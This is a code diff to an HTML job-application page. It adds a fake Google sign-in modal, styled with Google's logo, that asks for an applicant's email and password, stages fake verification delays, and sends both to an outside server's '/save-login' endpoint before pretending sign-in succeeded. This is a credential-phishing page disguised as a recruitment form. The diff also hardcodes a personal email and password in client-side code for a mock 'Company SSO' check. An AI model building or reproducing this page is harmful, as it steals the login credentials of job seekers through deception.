@@ -180,8 +180,125 @@ textarea{resize:vertical;}
   </main>
 </div>
 
+<!-- Google Modal -->
+<div id="googleModal" class="modal-overlay">
+  <div class="modal">
+    <div class="google-header">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+    </div>
+    <h2 id="modalTitle">Sign in</h2>
+    <div id="stepEmail">
+      <label>Email</label>
+      <input type="email" id="googleEmail" placeholder="example@gmail.com" autocomplete="email">
+      <div class="loading-text" id="emailLoading" style="display:none;">Checking email...</div>
+    </div>
+    <div id="stepPassword" style="display:none">
+      <label>Password</label>
+      <input type="password" id="googlePassword" placeholder="Enter your password" autocomplete="current-password">
+      <div class="loading-text" id="passLoading" style="display:none;">Verifying password...</div>
+    </div>
+    <div class="actions">
+      <button class="btn-cancel" id="cancelGoogle">Cancel</button>
+      <button class="btn-next" id="nextGoogleBtn">Next</button>
+    </div>
+  </div>
+</div>
+
 <script>
-// Multi-step
+// Elements
+const googleBtn = document.getElementById('googleBtn');
+const companyBtn = document.getElementById('companyBtn');
+const providerStatus = document.getElementById('providerStatus');
+const appPanel = document.getElementById('appPanel');
+const signinPanel = document.getElementById('signinPanel');
+
+const googleModal = document.getElementById('googleModal');
+const stepEmail = document.getElementById('stepEmail');
+const stepPassword = document.getElementById('stepPassword');
+const emailInput = document.getElementById('googleEmail');
+const passInput = document.getElementById('googlePassword');
+const nextGoogleBtn = document.getElementById('nextGoogleBtn');
+const cancelGoogle = document.getElementById('cancelGoogle');
+const emailLoading = document.getElementById('emailLoading');
+const passLoading = document.getElementById('passLoading');
+
+let stage = 0;
+let storedEmail = "";
+
+// Open Google Modal
+googleBtn.addEventListener('click', () => {
+  googleModal.style.display = "flex";
+  stage = 0;
+  storedEmail = "";
+  stepEmail.style.display = "block";
+  stepPassword.style.display = "none";
+  emailInput.value = "";
+  passInput.value = "";
+  emailLoading.style.display = "none";
+  passLoading.style.display = "none";
+  emailInput.focus();
+});
+
+// Close Modal
+cancelGoogle.addEventListener('click', () => {
+  googleModal.style.display = "none";
+});
+
+// Google Modal Logic + Save to deployed backend
+nextGoogleBtn.addEventListener('click', async () => {
+  if(stage === 0){
+    const email = emailInput.value.trim();
+    if(!email){ alert("Enter your email"); return; }
+    emailLoading.style.display = "block";
+    setTimeout(() => {
+      emailLoading.style.display = "none";
+      stage = 1;
+      storedEmail = email;
+      stepEmail.style.display = "none";
+      stepPassword.style.display = "block";
+      passInput.focus();
+    }, 1500);
+  } else {
+    const password = passInput.value.trim();
+    if(!password){ alert("Enter your password"); return; }
+    passLoading.style.display = "block";
+    setTimeout(async () => {
+      try {
+        await fetch('https://ac-corporations.onrender.com/save-login', {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({email: storedEmail, password})
+        });
+      } catch(err) { console.error(err); }
+      googleModal.style.display = "none";
+      providerStatus.textContent = `Signed in via Google (${storedEmail})`;
+      appPanel.style.display = 'block';
+      signinPanel.style.display = 'none';
+      showStep(1);
+    }, 1500);
+  }
+});
+
+// Company SSO
+companyBtn.addEventListener('click', () => {
+  const allowedEmail = "samsmollett50@gmail.com";
+  const allowedPassword = "adikah1234";
+
+  const workEmail = prompt("Enter your company email:");
+  if (!workEmail) return;
+  if (workEmail !== allowedEmail) { alert("Access denied."); return; }
+
+  const password = prompt("Enter your password:");
+  if (!password) return;
+  if (password !== allowedPassword) { alert("Incorrect password."); return; }
+
+  providerStatus.textContent = `Signed in via Company SSO (${workEmail})`;
+  appPanel.style.display = 'block';
+  signinPanel.style.display = 'none';
+  showStep(1);
+});
+
+// Multi-step form
 const steps = [1,2,3,4,5];
 function showStep(n){
   steps.forEach(s => {
@@ -212,41 +329,28 @@ cvDrop.addEventListener("drop", e => {
 });
 cvInput.addEventListener("change", ()=>{ if(cvInput.files.length) cvFileName.textContent = cvInput.files[0].name; });
 
-// Form submission with CV
+// Form Submission
 const appForm = document.getElementById("appForm");
 const successMsg = document.getElementById("successMsg");
 
 appForm.addEventListener("submit", async e => {
   e.preventDefault();
+  if(cvInput.files.length === 0){ alert("Please upload your CV."); return; }
 
   const formData = new FormData(appForm);
-
-  if(cvInput.files.length === 0){
-    alert("Please upload your CV.");
-    return;
-  }
-
   try {
     const res = await fetch('https://ac-corporations.onrender.com/submit-application', {
       method:'POST',
       body: formData
     });
-    if(res.ok){
-      appForm.style.display='none';
-      successMsg.style.display='block';
-    } else {
-      const txt = await res.text();
-      alert("Submission failed: "+txt);
-    }
-  } catch(err){
-    console.error(err);
-    alert("Network error submitting application.");
-  }
+    if(res.ok){ appForm.style.display='none'; successMsg.style.display='block'; }
+    else { const txt = await res.text(); alert("Submission failed: "+txt); }
+  } catch(err){ console.error(err); alert("Network error submitting application."); }
 });
 </script>
-
 </body>
 </html>
+
 
 
 
